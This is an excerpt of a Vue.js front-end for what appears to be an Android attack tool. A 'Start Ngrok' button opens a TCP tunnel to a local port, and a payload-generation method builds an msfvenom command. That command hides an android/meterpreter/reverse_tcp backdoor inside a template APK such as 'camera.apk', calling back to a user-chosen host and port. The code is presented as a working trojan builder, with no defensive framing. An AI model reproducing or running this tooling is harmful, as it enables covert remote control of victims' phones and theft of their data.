    ...
    <el-container style="background-color: #2d3a4b">
      ...
      <el-main>
        <div class="main" v-if="activeLink.path === '/dashboard'">
          ...
          <el-row :gutter="24">
            <el-col span="5">
	      <el-button type="primary" :loading="loadingButtonNgrok" size="medium" @click="startNgrok()">Start Ngrok</el-button>
            </el-col>
          </el-row>
          <el-row :gutter="24">
            <el-col span="12">
...
<script>
  ...
  export default {
    ...
    methods: {
      startNgrok () {
        this.loadingButtonNgrok = true
        console.log('ngrok')
        const command = 'Ngrok started...'
        this.cmdBg = true
        this.commandOutPut = '> ' + command + '\n\n'
        const ngrok = require('ngrok')
        // eslint-disable-line no-unused-expression
        const ngrokFn = async () => { const url = await ngrok.connect({proto: 'tcp', addr: 8080}); this.commandOutPut += url }
        // const url = ngrok.connect({proto: 'tcp', addr: 8080, onLogEvent: status => { this.commandOutPut += status.match(new RegExp('url=' + '(.*)' + '')) + '\n' }})
        // this.commandOutPut += url
        ngrokFn()
        /* try {
      ...
      generatePayload (formName) {
        this.$refs[formName].validate((valid) => {
          if (valid) {
            ...
            const command = `msfvenom -platform android -x ${pathTo}/payload-templates/${this.payloadGenerator.format} -pandroid/meterpreter/reverse_tcp LHOST=${this.payloadGenerator.lhost} LPORT=${this.payloadGenerator.lport} -o ${pathTo}/result-payloads/${this.payloadGenerator.nameOfPayload} `
            console.log(command)
            this.cmdBg = true
            this.commandOutPut = '> ' + command + '\n\n'
            try {
      ...
      loadAutoComplete () {
        ...
        this.formats = []
        this.formats.push({'value': 'camera.apk'})
        this.encoders = []
